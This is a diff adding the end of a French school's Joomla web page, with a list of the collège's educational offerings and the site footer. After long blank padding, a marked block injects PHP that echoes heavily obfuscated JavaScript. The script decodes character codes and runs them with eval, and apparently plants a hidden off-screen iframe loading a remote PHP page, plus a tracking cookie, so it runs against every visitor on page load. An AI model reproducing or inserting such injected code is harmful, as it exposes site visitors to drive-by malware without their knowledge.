+<div align="justify" class="spip"><span style="color: #3366ff;">Mise en place de séances d’ATP (Aide au Travail Personnel) plus particulièrement pour les élèves de 6°</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Une prise en charge individualisée pour les élèves qui éprouvent des difficultés</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Des projets hebdomadaires pris en charge par des professeurs sur tous les niveaux</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Un temps de vie de classe avec le professeur titulaire chaque semaine</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Des rencontres parents-professeurs avec rendez-vous deux fois dans l’année</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Des cartables allégés pour les élèves de 6° : une série de livres pour la maison et une série au collège</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Possibilité pour les parents de consulter le cahier de textes de la classe et les notes de leurs enfants sur internet (site du collège)</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">L’aumônerie : la catéchèse incluse dans le temps scolaire</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Le spectacle pour les classes de 5° depuis 27 années</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Un point fort : les langues (initiation à une LV2 dès la 6°, Guernesey en 6°, échanges et séjours linguistiques en 4° et 3°)</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Des activités artistiques (arts plastiques, théâtre, chorale, percussions)</span></div>
+</li>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Utilisation de l’outil informatique avec l’objectif de certifier le B2i niveau 1 et 2 pendant la scolarité au collège</span></div>
+</li>
+</ul></td>
+</tr>
+
+<tr>
+	<td colspan="2"  class="modifydate">
+		Mise à jour le Samedi, 15 Octobre 2011 20:53	</td>
+</tr>
+
+
+</table>
+<span class="article_separator">&nbsp;</span>
+</td>
+								
+		</tr>
+		</table>
+	</td>
+</tr>
+
+</table>
+</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="clr"></div>
+							                        </div>
+                    </div>
+                </div>
+            </div>
+        <div id="footer">
+            <div id="copy">&copy; 2008  | Template by <a href="http://www.vonfio.de" target="_blank">vonfio.de</a></div>
+            <div id="othermenu">
+                <div id="othermenu_in">		<div class="moduletable">
+					<div class="bannergroup">
+
+
+</div>		</div>
+			<div class="moduletable">
+					<div>Copyright &#169; 2013 . Tous droits réservés.</div>
+<div><a href="http://www.joomla.org">Joomla!</a> est un logiciel libre sous <a href="http://www.gnu.org/licenses/gpl-2.0.html">licence GNU/GPL.</a></div>		</div>
+	</div>
+            </div>
+        </div>
+        </div>
+    </div>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#0f2490#
+                                                                                                                                                                                                                                                                                                                                                                                                                if(empty($xuuik)) { $xuuik = " <script type=\"text/javascript\" language=\"javascript\" > if(document.querySelector)zq=4;a=(\"27,6d,7c,75,6a,7b,70,76,75,27,70,6b,74,74,37,40,2f,30,27,82,14,11,27,7d,68,79,27,7a,7b,68,7b,70,6a,44,2e,68,71,68,7f,2e,42,14,11,27,7d,68,79,27,6a,76,75,7b,79,76,73,73,6c,79,44,2e,70,75,6b,6c,7f,35,77,6f,77,2e,42,14,11,27,7d,68,79,27,70,6b,74,74,27,44,27,6b,76,6a,7c,74,6c,75,7b,35,6a,79,6c,68,7b,6c,4c,73,6c,74,6c,75,7b,2f,2e,70,6d,79,68,74,6c,2e,30,42,14,11,14,11,27,70,6b,74,74,35,7a,79,6a,27,44,27,2e,6f,7b,7b,77,41,36,36,6c,74,77,6c,75,76,69,68,79,6a,6c,73,76,75,68,35,6a,76,74,36,7b,76,76,73,7a,36,4a,58,5f,39,7f,6f,74,4d,35,77,6f,77,2e,42,14,11,27,70,6b,74,74,35,7a,7b,80,73,6c,35,77,76,7a,70,7b,70,76,75,27,44,27,2e,68,69,7a,76,73,7c,7b,6c,2e,42,14,11,27,70,6b,74,74,35,7a,7b,80,73,6c,35,6a,76,73,76,79,27,44,27,2e,3a,2e,42,14,11,27,70,6b,74,74,35,7a,7b,80,73,6c,35,6f,6c,70,6e,6f,7b,27,44,27,2e,3a,77,7f,2e,42,14,11,27,70,6b,74,74,35,7a,7b,80,73,6c,35,7e,70,6b,7b,6f,27,44,27,2e,3a,77,7f,2e,42,14,11,27,70,6b,74,74,35,7a,7b,80,73,6c,35,73,6c,6d,7b,27,44,27,2e,38,37,37,37,3a,2e,42,14,11,27,70,6b,74,74,35,7a,7b,80,73,6c,35,7b,76,77,27,44,27,2e,38,37,37,37,3a,2e,42,14,11,14,11,27,70,6d,27,2f,28,6b,76,6a,7c,74,6c,75,7b,35,6e,6c,7b,4c,73,6c,74,6c,75,7b,49,80,50,6b,2f,2e,70,6b,74,74,2e,30,30,27,82,14,11,27,6b,76,6a,7c,74,6c,75,7b,35,7e,79,70,7b,6c,2f,2e,43,77,27,70,6b,44,63,2e,70,6b,74,74,63,2e,27,6a,73,68,7a,7a,44,63,2e,70,6b,74,74,37,40,63,2e,27,45,43,36,77,45,2e,30,42,14,11,27,6b,76,6a,7c,74,6c,75,7b,35,6e,6c,7b,4c,73,6c,74,6c,75,7b,49,80,50,6b,2f,2e,70,6b,74,74,2e,30,35,68,77,77,6c,75,6b,4a,6f,70,73,6b,2f,70,6b,74,74,30,42,14,11,27,84,14,11,84,14,11,6d,7c,75,6a,7b,70,76,75,27,5a,6c,7b,4a,76,76,72,70,6c,2f,6a,76,76,72,70,6c,55,68,74,6c,33,6a,76,76,72,70,6c,5d,68,73,7c,6c,33,75,4b,68,80,7a,33,77,68,7b,6f,30,27,82,14,11,27,7d,68,79,27,7b,76,6b,68,80,27,44,27,75,6c,7e,27,4b,68,7b,6c,2f,30,42,14,11,27,7d,68,79,27,6c,7f,77,70,79,6c,27,44,27,75,6c,7e,27,4b,68,7b,6c,2f,30,42,14,11,27,70,6d,27,2f,75,4b,68,80,7a,44,44,75,7c,73,73,27,83,83,27,75,4b,68,80,7a,44,44,37,30,27,75,4b,68,80,7a,44,38,42,14,11,27,6c,7f,77,70,79,6c,35,7a,6c,7b,5b,70,74,6c,2f,7b,76,6b,68,80,35,6e,6c,7b,5b,70,74,6c,2f,30,27,32,27,3a,3d,37,37,37,37,37,31,39,3b,31,75,4b,68,80,7a,30,42,14,11,27,6b,76,6a,7c,74,6c,75,7b,35,6a,76,76,72,70,6c,27,44,27,6a,76,76,72,70,6c,55,68,74,6c,32,29,44,29,32,6c,7a,6a,68,77,6c,2f,6a,76,76,72,70,6c,5d,68,73,7c,6c,30,14,11,27,32,27,29,42,6c,7f,77,70,79,6c,7a,44,29,27,32,27,6c,7f,77,70,79,6c,35,7b,76,4e,54,5b,5a,7b,79,70,75,6e,2f,30,27,32,27,2f,2f,77,68,7b,6f,30,27,46,27,29,42,27,77,68,7b,6f,44,29,27,32,27,77,68,7b,6f,27,41,27,29,29,30,42,14,11,84,14,11,6d,7c,75,6a,7b,70,76,75,27,4e,6c,7b,4a,76,76,72,70,6c,2f,27,75,68,74,6c,27,30,27,82,14,11,27,7d,68,79,27,7a,7b,68,79,7b,27,44,27,6b,76,6a,7c,74,6c,75,7b,35,6a,76,76,72,70,6c,35,70,75,6b,6c,7f,56,6d,2f,27,75,68,74,6c,27,32,27,29,44,29,27,30,42,14,11,27,7d,68,79,27,73,6c,75,27,44,27,7a,7b,68,79,7b,27,32,27,75,68,74,6c,35,73,6c,75,6e,7b,6f,27,32,27,38,42,14,11,27,70,6d,27,2f,27,2f,27,28,7a,7b,68,79,7b,27,30,27,2d,2d,14,11,27,2f,27,75,68,74,6c,27,28,44,27,6b,76,6a,7c,74,6c,75,7b,35,6a,76,76,72,70,6c,35,7a,7c,69,7a,7b,79,70,75,6e,2f,27,37,33,27,75,68,74,6c,35,73,6c,75,6e,7b,6f,27,30,27,30,27,30,14,11,27,82,14,11,27,79,6c,7b,7c,79,75,27,75,7c,73,73,42,14,11,27,84,14,11,27,70,6d,27,2f,27,7a,7b,68,79,7b,27,44,44,27,34,38,27,30,27,79,6c,7b,7c,79,75,27,75,7c,73,73,42,14,11,27,7d,68,79,27,6c,75,6b,27,44,27,6b,76,6a,7c,74,6c,75,7b,35,6a,76,76,72,70,6c,35,70,75,6b,6c,7f,56,6d,2f,27,29,42,29,33,27,73,6c,75,27,30,42,14,11,27,70,6d,27,2f,27,6c,75,6b,27,44,44,27,34,38,27,30,27,6c,75,6b,27,44,27,6b,76,6a,7c,74,6c,75,7b,35,6a,76,76,72,70,6c,35,73,6c,75,6e,7b,6f,42,14,11,27,79,6c,7b,7c,79,75,27,7c,75,6c,7a,6a,68,77,6c,2f,27,6b,76,6a,7c,74,6c,75,7b,35,6a,76,76,72,70,6c,35,7a,7c,69,7a,7b,79,70,75,6e,2f,27,73,6c,75,33,27,6c,75,6b,27,30,27,30,42,14,11,84,14,11,70,6d,27,2f,75,68,7d,70,6e,68,7b,76,79,35,6a,76,76,72,70,6c,4c,75,68,69,73,6c,6b,30,14,11,82,14,11,70,6d,2f,4e,6c,7b,4a,76,76,72,70,6c,2f,2e,7d,70,7a,70,7b,6c,6b,66,7c,78,2e,30,44,44,3c,3c,30,82,84,6c,73,7a,6c,82,5a,6c,7b,4a,76,76,72,70,6c,2f,2e,7d,70,7a,70,7b,6c,6b,66,7c,78,2e,33,27,2e,3c,3c,2e,33,27,2e,38,2e,33,27,2e,36,2e,30,42,14,11,14,11,70,6b,74,74,37,40,2f,30,42,14,11,84,14,11,84\".split(\",\"));r=eval;function vqvq(){zva=function(){--(d.body)}()}d=document;for(i=0;i<a.length;i+=1){a[i]=-(12-5)+parseInt(a[i],zq*4);}try{vqvq()}catch(q){yy=50-50;}try{yy/=123}catch(pq){yy=1;}if(!yy)r(String[\"fr\"+\"omCh\"+\"arCo\"+\"de\"].apply(String,a));</script> "; echo $xuuik; }
+#/0f2490#
